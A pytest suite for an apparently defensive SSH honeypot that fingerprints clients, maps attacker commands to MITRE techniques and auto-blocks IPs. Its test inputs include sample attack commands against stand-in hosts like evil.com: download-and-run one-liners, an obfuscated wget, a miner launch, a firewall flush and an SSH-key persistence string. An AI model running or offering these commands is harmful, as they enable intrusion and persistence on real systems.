"""
CloudSentinel Stage 1 — Comprehensive integration and unit tests.
Covers: HASSH, MITRE, SOAR, VFS, pipeline, command registry, webhooks, metrics.
"""

from __future__ import annotations

import hashlib
import json
import time
from pathlib import Path

import pytest
from cloudsentinel.admin_api import _is_noise_event, _is_noise_text, _trim_replay_entries, create_admin_app
from cloudsentinel.commands import CommandAdapter
from cloudsentinel.commands.base import commands as cmd_registry
from cloudsentinel.config import load_settings
from cloudsentinel.event_codec import dumps_text, loads_text
from cloudsentinel.geoip import is_public_ip
from cloudsentinel.hassh import (
    HASSHDNA,
    calculate_hassh,
    fallback_hassh_from_version,
    infer_client_software,
    normalize_algorithm_list,
)
from cloudsentinel.mitre import MITRE_TECHNIQUES, deobfuscate_bash, match_command, score_command
from cloudsentinel.pipeline import ClickHouseForwarder, EventEnvelope, EventPipeline
from cloudsentinel.soar import SOAREngine
from cloudsentinel.stream import LiveStream
from cloudsentinel.vfs import VirtualFileSystem
from cloudsentinel.vfs_agent import VFSAgent, VFSContext
from cloudsentinel.webhook import WebhookConfig, WebhookNotifier
from fastapi.testclient import TestClient
from pydantic import SecretStr

# ═══════════════════════════════════════════════════════════════════
# Config Tests
# ═══════════════════════════════════════════════════════════════════

def test_config_loads_usas_profile() -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    assert settings.honeypot.hostname == "usas-prod-srv-01"
    assert settings.honeypot.os_version == "Ubuntu 22.04 LTS"
    assert settings.honeypot.ssh_port == 2222
    assert settings.honeypot.http_enabled is False
    assert settings.fingerprinting.enable_hassh is True
    assert settings.fingerprinting.enable_ja4s is True


def test_config_tls_settings() -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    assert settings.honeypot.tls_enabled is False
    assert hasattr(settings.honeypot, "tls_cert_file")
    assert hasattr(settings.honeypot, "tls_key_file")


def test_config_soar_defaults_to_dry_run() -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    assert settings.soar.firewall_enabled is True
    assert settings.soar.firewall_dry_run is True
    assert settings.soar.risk_threshold == 70
    assert "169.254.169.254" in settings.soar.allowlist
    assert settings.stream.port == 3001
    assert settings.llm.response_policy_enabled is True
    assert settings.llm.llm_safe_fallback_enabled is True
    assert settings.llm.response_template_max_lines >= 2
    assert "clickhouse-client" in settings.llm.blocked_command_prefixes


def test_admin_api_token_protects_stats_and_metrics() -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    settings.admin.token = SecretStr("test-token")
    pipeline = EventPipeline(settings.redis)
    app = create_admin_app(settings, pipeline)
    client = TestClient(app)

    assert client.get("/healthz").status_code == 200
    assert client.get("/stats").status_code == 401
    headers = {"Authorization": "Bearer test-token"}
    assert client.get("/stats", headers=headers).status_code == 200
    metrics_response = client.get("/metrics", headers=headers)
    assert metrics_response.status_code == 200
    assert "cloudsentinel_connections_total" in metrics_response.text
    readiness = client.get("/readiness", headers=headers)
    assert readiness.status_code == 200
    assert readiness.json()["clickhouse_enabled"] is False


def test_admin_api_manual_block_rejects_private_ip() -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    settings.admin.token = SecretStr("test-token")
    pipeline = EventPipeline(settings.redis)
    app = create_admin_app(settings, pipeline)
    client = TestClient(app)

    response = client.post(
        "/admin/block-ip",
        headers={"Authorization": "Bearer test-token"},
        json={"ip": "10.0.0.1", "ttl": 3600, "reason": "test"},
    )
    assert response.status_code == 400


def test_admin_api_noise_classifiers() -> None:
    assert _is_noise_event("cloudsentinel.session.connect") is True
    assert _is_noise_event("cloudsentinel.command.input") is False
    assert _is_noise_text("cloudsentinel.session.closed") is True
    assert _is_noise_text("root / [redacted]") is True
    assert _is_noise_text("whoami") is False


def test_trim_replay_keeps_info_tags() -> None:
    replay: list[dict[str, str]] = [
        {"role": "honeypot", "text": "[OPEN] Session opened", "timestamp": "10:00:00.001"},
    ]
    for idx in range(500):
        replay.append(
            {
                "role": "attacker" if idx % 2 == 0 else "honeypot",
                "text": f"cmd-{idx}",
                "timestamp": f"10:00:{idx % 60:02d}.{idx:03d}",
            }
        )
    replay.append({"role": "honeypot", "text": "[AUTH] Failed login for root attempt 1", "timestamp": "10:09:59.010"})
    replay.append({"role": "honeypot", "text": "[CLOSE] Session closed (12.0s)", "timestamp": "10:10:00.000"})

    trimmed = _trim_replay_entries(replay, limit=400)
    assert len(trimmed) <= 400
    texts = [entry["text"] for entry in trimmed]
    assert any(text.startswith("[OPEN]") for text in texts)
    assert any(text.startswith("[AUTH]") for text in texts)
    assert any(text.startswith("[CLOSE]") for text in texts)


def test_admin_api_exposure_uses_honeypot_ports(monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[list[str]] = []

    async def fake_run_command(args: list[str], timeout: float = 5.0) -> tuple[int, str, str]:
        calls.append(args)
        return (1 if args[1] == "-C" else 0, "", "")

    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    settings.admin.token = SecretStr("test-token")
    pipeline = EventPipeline(settings.redis)
    monkeypatch.setattr("cloudsentinel.admin_api._run_command", fake_run_command)
    app = create_admin_app(settings, pipeline)
    client = TestClient(app)

    response = client.post(
        "/admin/exposure",
        headers={"Authorization": "Bearer test-token"},
        json={"enabled": False},
    )
    assert response.status_code == 200
    assert response.json()["paused"] is True
    assert any(call[1:4] == ["-I", "INPUT", "1"] for call in calls)
    assert {"22", str(settings.honeypot.ssh_port)}.issubset({part for call in calls for part in call})


# ═══════════════════════════════════════════════════════════════════
# Event Codec Tests
# ═══════════════════════════════════════════════════════════════════

def test_event_codec_round_trip() -> None:
    payload = {"event_type": "shell.command", "payload": {"command": "id"}}
    assert loads_text(dumps_text(payload)) == payload


def test_event_codec_nested_objects() -> None:
    payload = {
        "eventid": "test",
        "session": "abc123",
        "nested": {"deep": {"value": [1, 2, 3]}},
    }
    assert loads_text(dumps_text(payload)) == payload


# ═══════════════════════════════════════════════════════════════════
# HASSH Tests
# ═══════════════════════════════════════════════════════════════════

def test_hassh_exact_format() -> None:
    hassh, algorithms = calculate_hassh(
        ["curve25519-sha256", "diffie-hellman-group14-sha256"],
        ["aes128-ctr"],
        ["hmac-sha2-256"],
        ["none"],
    )
    assert algorithms == "curve25519-sha256,diffie-hellman-group14-sha256;aes128-ctr;hmac-sha2-256;none"
    assert hassh == hashlib.md5(algorithms.encode("utf-8")).hexdigest()


def test_hassh_normalizes_bytes_and_csv() -> None:
    assert normalize_algorithm_list(b"a,b, c ,,") == ["a", "b", "c"]
    hassh, algorithms = calculate_hassh("a,b", [b"c"], ["d"], ["none"])
    assert algorithms == "a,b;c;d;none"


def test_hassh_normalizes_none() -> None:
    assert normalize_algorithm_list(None) == []
    assert normalize_algorithm_list("") == []


def test_hassh_dna_botnet_detection() -> None:
    dna = HASSHDNA()
    # Mirai
    intel = dna.lookup("8ba2faa57b1f0332fa12cc96bdf3e1be")
    assert intel["threat_level"] == "critical"
    assert intel["botnet_family"] == "Mirai"
    # Unknown
    intel = dna.lookup("00000000000000000000000000000000")
    assert intel["threat_level"] == "unknown"


def test_hassh_dna_all_hashes_are_real_md5() -> None:
    import re
    dna = HASSHDNA()
    md5_pattern = re.compile(r"^[a-f0-9]{32}$")
    for h in dna._KNOWN:
        assert md5_pattern.match(h), f"Invalid MD5: {h}"


def test_hassh_dna_sighting_tracking() -> None:
    dna = HASSHDNA()
    dna.record_sighting("8ba2faa57b1f0332fa12cc96bdf3e1be", "10.0.0.1")
    stats = dna.get_stats("8ba2faa57b1f0332fa12cc96bdf3e1be")
    assert stats["count"] == 1


def test_hassh_dna_add_intel() -> None:
    dna = HASSHDNA()
    dna.add_intel("deadbeef" * 4, "Test Malware", "TestBot", "high")
    intel = dna.lookup("deadbeef" * 4)
    assert intel["threat_level"] == "high"


def test_hassh_fallback_from_version_is_stable() -> None:
    h1, a1 = fallback_hassh_from_version("SSH-2.0-libssh_0.9.6", "SSH-2.0-OpenSSH_8.9p1")
    h2, a2 = fallback_hassh_from_version("SSH-2.0-libssh_0.9.6", "SSH-2.0-OpenSSH_8.9p1")
    assert h1 == h2
    assert a1 == a2
    assert len(h1) == 32


def test_infer_client_software_from_version() -> None:
    assert infer_client_software("SSH-2.0-paramiko_3.4.0") == "Paramiko"
    assert infer_client_software("SSH-2.0-libssh_0.9.6") == "libssh"
    assert infer_client_software("SSH-2.0-Go") == "Go crypto/ssh"


# ═══════════════════════════════════════════════════════════════════
# MITRE Tests
# ═══════════════════════════════════════════════════════════════════

def test_mitre_scores_attack_command() -> None:
    annotation = score_command("curl http://evil/payload.sh | sh -c id && chmod 777 x")
    assert annotation["risk_score"] > 0
    assert "T1105" in annotation["mitre_techniques"]
    assert "T1059.004" in annotation["mitre_techniques"]
    assert "T1222" in annotation["mitre_techniques"]


def test_mitre_scores_wget_download() -> None:
    annotation = score_command("wget http://malware.com/bot.sh -O /tmp/bot.sh")
    assert "T1105" in annotation["mitre_techniques"]
    assert annotation["risk_score"] >= 25


def test_mitre_scores_iptables_flush() -> None:
    annotation = score_command("iptables -F INPUT")
    assert "T1562" in annotation["mitre_techniques"]


def test_mitre_scores_crypto_miner() -> None:
    annotation = score_command("./xmrig --config config.json &")
    assert "T1496" in annotation["mitre_techniques"]


def test_mitre_scores_authorized_keys_persistence() -> None:
    annotation = score_command(
        "rm -rf .ssh && mkdir .ssh && echo 'ssh-rsa AAAAB3Nza...' >> .ssh/authorized_keys && chmod 600 .ssh/authorized_keys"
    )
    assert "T1098" in annotation["mitre_techniques"]
    assert annotation["risk_score"] >= 40


def test_mitre_deobfuscate_bash() -> None:
    cmd = "w'g'e't http://evil.com -O /t'm'p/x"
    result = deobfuscate_bash(cmd)
    assert "wget" in result


def test_mitre_match_command_returns_unique() -> None:
    # Same technique should only appear once
    matches = match_command("wget http://a.com && curl http://b.com")
    t1105_count = sum(1 for tid, _, _ in matches if tid == "T1105")
    assert t1105_count == 1


def test_mitre_has_phase1_coverage_target() -> None:
    assert len(MITRE_TECHNIQUES) >= 15


# ═══════════════════════════════════════════════════════════════════
# GeoIP Tests
# ═══════════════════════════════════════════════════════════════════

def test_geoip_public_ip_detection() -> None:
    assert is_public_ip("8.8.8.8") is True
    assert is_public_ip("10.0.0.1") is False
    assert is_public_ip("192.168.1.1") is False
    assert is_public_ip("127.0.0.1") is False
    assert is_public_ip("172.16.0.1") is False


# ═══════════════════════════════════════════════════════════════════
# SOAR Tests
# ═══════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_soar_scores_failed_login() -> None:
    soar = SOAREngine()
    event = {
        "eventid": "cloudsentinel.login.failed",
        "session": "s1",
        "src_ip": "203.0.113.1",
        "username": "root",
        "password": "admin123",
        "country_code": "RU",
    }
    result = await soar.process_event("s1", event)
    assert result["cloudsentinel_risk_score"] >= 10  # geo bonus
    assert "T1110" in result["cloudsentinel_mitre_techniques"]


@pytest.mark.asyncio
async def test_soar_scores_malicious_command() -> None:
    soar = SOAREngine()
    # First: failed login
    event1 = {
        "eventid": "cloudsentinel.login.failed",
        "session": "s2",
        "src_ip": "45.155.205.1",
        "username": "root",
        "password": "toor",
        "country_code": "CN",
    }
    await soar.process_event("s2", event1)
    # Then: malicious command
    event2 = {
        "eventid": "cloudsentinel.command.input",
        "session": "s2",
        "src_ip": "45.155.205.1",
        "input": "wget http://evil.com/bot.sh && chmod 777 bot.sh",
        "country_code": "CN",
    }
    result = await soar.process_event("s2", event2)
    assert result["cloudsentinel_risk_score"] >= 35
    for tech in ("T1105", "T1222"):
        assert tech in result["cloudsentinel_mitre_techniques"]


@pytest.mark.asyncio
async def test_soar_time_decay() -> None:
    soar = SOAREngine(decay_rate=100.0)  # Fast decay for testing
    event = {
        "eventid": "cloudsentinel.login.failed",
        "session": "s3",
        "src_ip": "1.2.3.4",
        "country_code": "RU",
    }
    result1 = await soar.process_event("s3", event)
    score1 = result1["cloudsentinel_risk_score"]
    # Wait for decay
    import asyncio
    await asyncio.sleep(0.2)
    # Second event should have some decay
    result2 = await soar.process_event("s3", {**event, "eventid": "cloudsentinel.command.input", "input": "ls"})
    # Score should have decayed then added new score
    assert result2["cloudsentinel_risk_score"] >= 0


@pytest.mark.asyncio
async def test_soar_attack_chain_correlation() -> None:
    soar = SOAREngine()
    # Session 1 from same IP
    e1 = {"eventid": "cloudsentinel.login.failed", "session": "c1",
          "src_ip": "5.6.7.8", "country_code": "RU"}
    await soar.process_event("c1", e1)
    # Session 2 from same IP — should get chain bonus
    e2 = {"eventid": "cloudsentinel.login.failed", "session": "c2",
          "src_ip": "5.6.7.8", "country_code": "RU"}
    result = await soar.process_event("c2", e2)
    # Should have chain correlation bonus
    profile = soar.get_ip_profile("5.6.7.8")
    assert profile["active_sessions"] >= 2
    assert profile["cumulative_risk"] > 0
    assert "T1083" in result["cloudsentinel_mitre_techniques"]


@pytest.mark.asyncio
async def test_soar_ip_profiling() -> None:
    soar = SOAREngine()
    e = {"eventid": "cloudsentinel.session.connect", "session": "p1",
         "src_ip": "9.9.9.9", "country_code": "IR"}
    await soar.process_event("p1", e)
    profile = soar.get_ip_profile("9.9.9.9")
    assert profile["ip"] == "9.9.9.9"
    assert profile["is_blocked"] is False
    assert "p1" in profile["session_ids"]


@pytest.mark.asyncio
async def test_soar_get_attack_chains() -> None:
    soar = SOAREngine()
    for i in range(3):
        e = {"eventid": "cloudsentinel.login.failed", "session": f"chain_{i}",
             "src_ip": "1.1.1.1", "country_code": "KP"}
        await soar.process_event(f"chain_{i}", e)
    chains = soar.get_attack_chains()
    assert len(chains) >= 1
    assert chains[0]["sessions"] >= 3


@pytest.mark.asyncio
async def test_soar_dry_run_block_does_not_call_iptables() -> None:
    soar = SOAREngine(risk_threshold=30, firewall_enabled=True, firewall_dry_run=True)
    event = {
        "eventid": "cloudsentinel.command.input",
        "session": "dry1",
        "src_ip": "8.8.8.8",
        "country_code": "XX",
        "input": "wget http://evil.example/bot.sh && chmod 777 bot.sh",
    }
    result = await soar.process_event("dry1", event)
    assert result["cloudsentinel_soar_action"] == "dry_run_block"
    assert soar.get_ip_profile("8.8.8.8")["is_blocked"] is False
    assert isinstance(result["mttb_ms"], float)


@pytest.mark.asyncio
async def test_soar_allowlist_never_blocks_admin_private_or_metadata() -> None:
    soar = SOAREngine(risk_threshold=30, firewall_enabled=True, firewall_dry_run=False, allowlist=[
        "8.8.8.8",
        "127.0.0.1",
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16",
        "169.254.169.254",
    ])
    event = {
        "eventid": "cloudsentinel.command.input",
        "session": "allow1",
        "src_ip": "8.8.8.8",
        "country_code": "RU",
        "input": "wget http://evil.example/bot.sh && chmod 777 bot.sh",
    }
    result = await soar.process_event("allow1", event)
    assert result["cloudsentinel_soar_action"] == "skip_allowlisted_ip"
    for ip in ("127.0.0.1", "10.1.2.3", "172.16.3.4", "192.168.1.10", "169.254.169.254"):
        assert soar.is_allowlisted(ip)


@pytest.mark.asyncio
async def test_soar_active_block_uses_duplicate_check(monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[list[str]] = []

    class FakeProc:
        def __init__(self, returncode: int) -> None:
            self.returncode = returncode

        async def communicate(self) -> tuple[bytes, bytes]:
            return b"", b""

    async def fake_exec(*args: str, **_kwargs: object) -> FakeProc:
        calls.append(list(args))
        return FakeProc(1 if "-C" in args else 0)

    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
    soar = SOAREngine(risk_threshold=30, firewall_enabled=True, firewall_dry_run=False, block_ttl=0)
    event = {
        "eventid": "cloudsentinel.command.input",
        "session": "active1",
        "src_ip": "8.8.4.4",
        "country_code": "RU",
        "input": "wget http://evil.example/bot.sh && chmod 777 bot.sh",
    }
    result = await soar.process_event("active1", event)
    assert result["cloudsentinel_soar_action"] == "iptables_block"
    assert calls[0][1] == "-C"
    assert calls[1][1] == "-A"
    assert isinstance(result["mttb_ms"], float)


@pytest.mark.asyncio
async def test_soar_forces_block_on_persistence_attempt() -> None:
    soar = SOAREngine(risk_threshold=95, firewall_enabled=True, firewall_dry_run=True)
    event = {
        "eventid": "cloudsentinel.command.input",
        "session": "persist1",
        "src_ip": "8.8.4.4",
        "country_code": "XX",
        "input": "rm -rf .ssh && mkdir .ssh && echo 'ssh-rsa AAAAB3Nza...' >> .ssh/authorized_keys && chmod 600 .ssh/authorized_keys",
    }
    result = await soar.process_event("persist1", event)
    assert "T1098" in result["cloudsentinel_mitre_techniques"]
    assert result["cloudsentinel_soar_action"] == "dry_run_block"


@pytest.mark.asyncio
async def test_stream_emits_sanitized_event_with_password() -> None:
    emitted: list[dict] = []

    class FakeSio:
        async def emit(self, _name: str, payload: dict, **_kwargs: object) -> None:
            emitted.append(payload)

    stream = LiveStream()
    stream._started = True
    stream._sio = FakeSio()
    await stream.emit_coro({
        "eventid": "cloudsentinel.login.failed",
        "username": "root",
        "password": "secret",
        "log_raw": "hidden",
        "input": "id",
    })
    assert emitted[0]["username"] == "root"
    assert emitted[0]["password"] == "secret"
    assert "log_raw" not in emitted[0]
    assert stream._buffer[0]["password"] == "secret"


# ═══════════════════════════════════════════════════════════════════
# VFS Tests
# ═══════════════════════════════════════════════════════════════════

def test_vfs_builds_default() -> None:
    vfs = VirtualFileSystem.build_default()
    assert len(vfs._entries) > 10
    assert vfs.exists("/etc/hostname")
    assert vfs.exists("/root/.ssh/authorized_keys")


def test_vfs_resolve_path() -> None:
    assert VirtualFileSystem.resolve_path("foo", "/root") == "/root/foo"
    assert VirtualFileSystem.resolve_path("../etc", "/root") == "/etc"
    assert VirtualFileSystem.resolve_path("/absolute", "/root") == "/absolute"


def test_vfs_file_contents() -> None:
    vfs = VirtualFileSystem.build_default()
    hostname = vfs.file_contents("/etc/hostname").decode().strip()
    assert hostname == "usas-prod-srv-01"


def test_vfs_honeytoken_files() -> None:
    vfs = VirtualFileSystem.build_default()
    # AWS credentials honeytoken
    assert vfs.exists("/root/.aws/credentials")
    aws_creds = vfs.file_contents("/root/.aws/credentials").decode()
    assert "AKIAIOSFODNN7EXAMPLE" in aws_creds
    # DB config honeytoken
    assert vfs.exists("/var/www/html/config.php")
    config = vfs.file_contents("/var/www/html/config.php").decode()
    assert "Ch4ng3M3_N0w!_2024" in config
    # Backup credentials
    assert vfs.exists("/root/usas_backup_credentials.txt")
    # Miner trap
    assert vfs.exists("/tmp/.hidden_miner_config")


def test_vfs_proc_stubs() -> None:
    vfs = VirtualFileSystem.build_default()
    cpuinfo = vfs.file_contents("/proc/cpuinfo").decode()
    assert "Intel(R) Xeon(R)" in cpuinfo
    meminfo = vfs.file_contents("/proc/meminfo").decode()
    assert "MemTotal" in meminfo


# ═══════════════════════════════════════════════════════════════════
# Command Adapter Tests
# ═══════════════════════════════════════════════════════════════════

def test_command_adapter_defaults() -> None:
    adapter = CommandAdapter()
    assert adapter.username == "root"
    assert adapter.cwd == "/root"
    assert "PATH" in adapter.environ


def test_command_adapter_capture_output() -> None:
    adapter = CommandAdapter()
    adapter.write("hello ")
    adapter.write("world")
    assert adapter.flush() == "hello world"
    # Buffer should be cleared after flush
    assert adapter.flush() == ""


def test_command_adapter_write_bytes() -> None:
    adapter = CommandAdapter()
    adapter.write(b"binary data")
    assert adapter.flush() == "binary data"


def test_command_registry_has_commands() -> None:
    assert len(cmd_registry) >= 55
    assert "/usr/bin/whoami" in cmd_registry
    assert "/usr/bin/uname" in cmd_registry
    assert "/usr/bin/wget" in cmd_registry
    assert "/bin/bash" in cmd_registry


def test_command_whoami_via_adapter() -> None:
    adapter = CommandAdapter(username="attacker")
    cmd_cls = cmd_registry["whoami"]
    cmd = cmd_cls(adapter)
    cmd.start()
    output = adapter.flush()
    assert "attacker" in output


def test_command_uname_via_adapter() -> None:
    adapter = CommandAdapter(hostname="test-srv-01")
    cmd_cls = cmd_registry["uname"]
    cmd = cmd_cls(adapter)
    cmd.start()
    output = adapter.flush()
    assert "Linux" in output


# ═══════════════════════════════════════════════════════════════════
# VFS Agent Tests
# ═══════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_vfs_mock_tracks_cwd_and_reads_decoys() -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    agent = VFSAgent(
        settings.llm,
        VFSContext(settings.honeypot.hostname, settings.honeypot.os_version),
    )
    try:
        assert await agent.run_command("hostname") == "usas-prod-srv-01"
        assert await agent.run_command("cd /etc") == ""
        assert await agent.run_command("pwd") == "/etc"
        assert "hostname" in await agent.run_command("ls")
        output = await agent.run_command("cat /etc/hostname")
        assert "usas-prod-srv-01" in output
    finally:
        await agent.close()


@pytest.mark.asyncio
async def test_vfs_mock_cat_honeytoken() -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    agent = VFSAgent(
        settings.llm,
        VFSContext(settings.honeypot.hostname, settings.honeypot.os_version),
    )
    try:
        output = await agent.run_command("cat /root/usas_backup_credentials.txt")
        assert "backup_user" in output or "usas_backup" in output
    finally:
        await agent.close()


@pytest.mark.asyncio
async def test_vfs_response_policy_blocks_risky_commands() -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    settings.llm.provider = "mock"
    settings.llm.response_policy_enabled = True
    agent = VFSAgent(
        settings.llm,
        VFSContext(settings.honeypot.hostname, settings.honeypot.os_version),
    )
    try:
        output, mode = await agent.run_command_with_mode("clickhouse-client --query 'select 1'")
        assert "command not found" in output
        assert mode == "blocked"
    finally:
        await agent.close()


@pytest.mark.asyncio
async def test_vfs_response_policy_templates_medium_commands() -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    settings.llm.provider = "mock"
    settings.llm.response_policy_enabled = True
    agent = VFSAgent(
        settings.llm,
        VFSContext(settings.honeypot.hostname, settings.honeypot.os_version),
    )
    try:
        output, mode = await agent.run_command_with_mode("ps aux")
        assert "PID" in output
        assert mode == "templated"
    finally:
        await agent.close()


# ═══════════════════════════════════════════════════════════════════
# Webhook Tests
# ═══════════════════════════════════════════════════════════════════

def test_webhook_config_defaults() -> None:
    config = WebhookConfig()
    assert config.enabled is False
    assert config.min_risk_score == 70


def test_webhook_config_disabled_noops() -> None:
    notifier = WebhookNotifier(WebhookConfig(enabled=False))
    # Can't easily test async method without mocking, but config is correct
    assert notifier.config.enabled is False


def test_webhook_format_payload() -> None:
    notifier = WebhookNotifier(WebhookConfig(enabled=True))
    event = {
        "src_ip": "192.0.2.1",
        "cloudsentinel_risk_score": 85,
        "cloudsentinel_soar_action": "iptables_block",
        "cloudsentinel_mitre_techniques": ["T1105", "T1059.004"],
        "country_name": "Russia",
        "city": "Moscow",
        "eventid": "cloudsentinel.command.input",
        "username": "root",
        "password": "admin",
        "hassh_md5": "8ba2faa57b1f0332fa12cc96bdf3e1be",
        "session": "test_session_123",
        "input": "wget http://evil.com/bot.sh",
    }
    payload = notifier._format_payload(event)
    assert payload["ip"] == "192.0.2.1"
    assert payload["action"] == "🚫 BLOCKED"
    assert "T1105" in payload["techniques"]


# ═══════════════════════════════════════════════════════════════════
# Pipeline Tests
# ═══════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_pipeline_buffers_when_redis_unavailable() -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    pipeline = EventPipeline(settings.redis)
    envelope = EventEnvelope(
        event_type="shell.command",
        session_id="s1",
        src_ip="203.0.113.10",
        src_port=53222,
        timestamp=1.0,
        payload={"command": "id"},
    )
    await pipeline.emit(envelope)
    assert len(pipeline._pending) == 1


@pytest.mark.asyncio
async def test_pipeline_enriches_command_with_mitre() -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    pipeline = EventPipeline(settings.redis)
    await pipeline.emit_command(
        session_id="s2",
        src_ip="203.0.113.20",
        src_port=42222,
        username="root",
        command="wget http://evil/payload.sh && chmod 777 payload.sh",
        output="",
        hassh="abc",
        ja4s="ja4s_ssh_test",
    )
    assert len(pipeline._pending) == 1
    fields = pipeline._pending[0].to_redis_fields()
    payload = json.loads(json.loads(fields["payload"]))
    assert payload["risk_score"] > 0
    assert payload["session_risk_score"] > 0
    assert "T1105" in payload["mitre_techniques"]
    assert "T1222" in payload["mitre_techniques"]


@pytest.mark.asyncio
async def test_pipeline_wal_persistence() -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    pipeline = EventPipeline(settings.redis)
    envelope = EventEnvelope(
        event_type="test.event",
        session_id="wal_test",
        src_ip="10.0.0.1",
        src_port=12345,
        timestamp=time.time(),
        payload={"test": True},
    )
    # Should write to WAL since no Redis connection
    await pipeline.emit(envelope)
    assert len(pipeline._pending) >= 1


def test_clickhouse_forwarder_flattens_redis_event() -> None:
    envelope = EventEnvelope(
        event_type="cloudsentinel.command.input",
        session_id="flat1",
        src_ip="8.8.8.8",
        src_port=4444,
        timestamp=1710000000.123,
        payload={
            "eventid": "cloudsentinel.command.input",
            "session": "flat1",
            "sensor": "CloudSentinel",
            "src_ip": "8.8.8.8",
            "src_port": 4444,
            "username": "root",
            "password": "toor",
            "input": "wget http://evil/bot.sh",
            "country_code": "US",
            "cloudsentinel_risk_score": 85,
            "cloudsentinel_mitre_techniques": ["T1105"],
            "cloudsentinel_soar_action": "dry_run_block",
            "mttb_ms": 12.5,
            "block_command": "/sbin/iptables -A INPUT -s 8.8.8.8 -j DROP",
            "timestamp": 1710000000.123,
        },
    )
    row = ClickHouseForwarder._redis_fields_to_row(envelope.to_redis_fields())
    assert row["eventid"] == "cloudsentinel.command.input"
    assert row["session"] == "flat1"
    assert row["username"] == "root"
    assert row["password"] == "toor"
    assert row["input"] == "wget http://evil/bot.sh"
    assert row["cloudsentinel_risk_score"] == 85
    assert row["cloudsentinel_mitre_techniques"] == ["T1105"]
    assert row["mttb_ms"] == 12.5
    assert row["block_command"].startswith("/sbin/iptables")


def test_clickhouse_forwarder_checkpoint_round_trip(tmp_path: Path) -> None:
    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    forwarder = ClickHouseForwarder(settings.redis, settings.clickhouse)
    forwarder._checkpoint_path = tmp_path / "lastid"
    assert forwarder._load_checkpoint() == "0-0"
    forwarder._save_checkpoint("1710000000000-3")
    assert forwarder._load_checkpoint() == "1710000000000-3"


def test_server_emits_connect_event_and_has_cli_args() -> None:
    source = Path("src/cloudsentinel/server.py").read_text(encoding="utf-8")
    assert "cloudsentinel.session.connect" in source
    assert 'parser.add_argument("--host")' in source
    assert 'parser.add_argument("--port", type=int)' in source
    assert "run_until_complete" not in source


def test_deploy_uses_module_entrypoint() -> None:
    source = Path("src/cloudsentinel/deploy.sh").read_text(encoding="utf-8")
    assert "python -m cloudsentinel.server --host 0.0.0.0 --port 2222" in source
    assert "pip install -r ${SENSOR_HOME}/requirements.txt" in source
    assert "redis-server" in source
    assert "CLICKHOUSE_ENABLED=true" in source
    assert "SOAR_FIREWALL_DRY_RUN=false" in source
    assert "MGMT_SSH_PORT=22222" in source
    assert "SOAR_ALLOWLIST" in source
    assert "STREAM_ENABLED=true" in source


def test_docker_compose_includes_clickhouse_and_private_infra() -> None:
    source = Path("src/cloudsentinel/docker-compose.yml").read_text(encoding="utf-8")
    assert "clickhouse/clickhouse-server:24.12" in source
    assert "./schema.sql:/docker-entrypoint-initdb.d/001-cloudsentinel.sql:ro" in source
    assert "CLICKHOUSE_ENABLED: \"true\"" in source
    assert "6379:6379" not in source
    assert "4222:4222" not in source
    assert "read_only: true" in source


# ═══════════════════════════════════════════════════════════════════
# Metrics Tests
# ═══════════════════════════════════════════════════════════════════

def test_metrics_singleton() -> None:
    from cloudsentinel.metrics import get_metrics
    m1 = get_metrics()
    m2 = get_metrics()
    assert m1 is m2


def test_metrics_counters() -> None:
    from cloudsentinel.metrics import get_metrics
    m = get_metrics()
    before = m.total_connections
    m.record_connect()
    assert m.total_connections == before + 1
    m.record_disconnect()
    m.record_auth_fail()
    m.record_auth_success()
    m.record_command()
    m.record_block("iptables_block")
    m.record_block("dry_run_block")
    m.set_mttb(12.34)
    assert m.total_auth_failures >= 1
    assert m.total_commands >= 1
    assert m.total_blocks_iptables >= 1
    assert m.total_blocks >= 2
    assert m.mttb_ms == 12.34


def test_admin_api_exposure_parses_boolean_string(monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[list[str]] = []

    async def fake_run_command(args: list[str], timeout: float = 5.0) -> tuple[int, str, str]:
        calls.append(args)
        return (1 if args[1] == "-C" else 0, "", "")

    settings = load_settings(
        Path("src/cloudsentinel/configs/usas-production.yaml"),
        Path("src/cloudsentinel/.env"),
    )
    settings.admin.token = SecretStr("test-token")
    pipeline = EventPipeline(settings.redis)
    monkeypatch.setattr("cloudsentinel.admin_api._run_command", fake_run_command)
    app = create_admin_app(settings, pipeline)
    client = TestClient(app)

    response = client.post(
        "/admin/exposure",
        headers={"Authorization": "Bearer test-token"},
        json={"enabled": "false"},
    )
    assert response.status_code == 200
    assert response.json()["paused"] is True
    assert any(call[1] == "-I" for call in calls)


